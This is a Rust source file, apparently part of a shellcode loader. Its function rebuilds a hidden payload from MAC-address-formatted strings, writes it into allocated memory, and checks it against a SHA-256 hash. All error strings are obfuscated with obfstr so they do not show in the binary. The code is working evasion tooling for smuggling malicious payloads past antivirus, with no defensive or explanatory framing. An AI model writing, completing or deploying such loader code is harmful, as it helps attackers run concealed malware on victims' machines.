use crate::alloc::alloc;

pub unsafe fn decrypt(decoded: &[u8]) -> Result<(usize, usize), String> {
    #[cfg(feature = "debug")]
    crate::utils::print_message("Using MAC decryption...");

    use sha2::{Sha256, Digest};
    use obfstr::obfstr;
    let data_str = std::str::from_utf8(decoded).map_err(|_| obfstr!("invalid utf8").to_string())?;
    let parts: Vec<&str> = data_str.split(',').collect();
    if parts.len() < 3 {
        return Err(obfstr!("mac payload format invalid").to_string());
    }
    let hex_hash = parts[0];
    let length_str = parts[1];
    let addresses_str = parts[2..].join(",");
    let hash = hex::decode(hex_hash).map_err(|_| obfstr!("invalid hex hash").to_string())?;
    if hash.len() != 32 {
        return Err(obfstr!("hash length mismatch").to_string());
    }
    let original_len: usize = length_str.parse().map_err(|_| obfstr!("invalid length").to_string())?;
    let addresses: Vec<&str> = addresses_str.split(',').collect();
    let p = unsafe { alloc(original_len)? };
    let buf = std::slice::from_raw_parts_mut(p, original_len);
    let mut idx = 0;
    'outer: for mac_str in addresses {
        let parts: Vec<&str> = mac_str.split('-').collect();
        if parts.len() != 6 { return Err(obfstr!("Invalid MAC address").to_string()); }
        for p in parts {
            if idx >= original_len { break 'outer; }
            let b = u8::from_str_radix(p, 16).map_err(|_| obfstr!("Invalid MAC byte").to_string())?;
            buf[idx] = b;
            idx += 1;
        }
    }
    let mut hasher = Sha256::new();
    hasher.update(&buf[..original_len]);
    let calc_hash = hasher.finalize();
    if hash != calc_hash.as_slice() {
        return Err(obfstr!("mac hash mismatch").to_string());
    }
    Ok((p as usize, original_len))
}